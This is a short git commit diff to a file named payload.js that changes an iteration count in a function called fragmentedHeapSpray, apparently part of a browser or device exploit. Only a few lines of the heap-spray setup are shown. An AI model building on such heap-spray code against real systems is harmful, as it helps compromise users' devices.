5e53ce6fd837e101bed09f2a2f3d6c0cb3d1205b
davilone32 <126024362+davilone32rl@users.noreply.github.com>
2024-11-04 21:58:11 +0100

    Update payload.js

--- WBN/payload.js
+++ WBN/payload.js
@@ -1,7 +1,7 @@
 (function() {
     const sprayArray = [];
     const largeObjectSize = 0x999999;  
-    const iterations = 210;            
+    const iterations = 209;            
 
     async function fragmentedHeapSpray() {
         for (let i = 0; i < iterations; i++) {
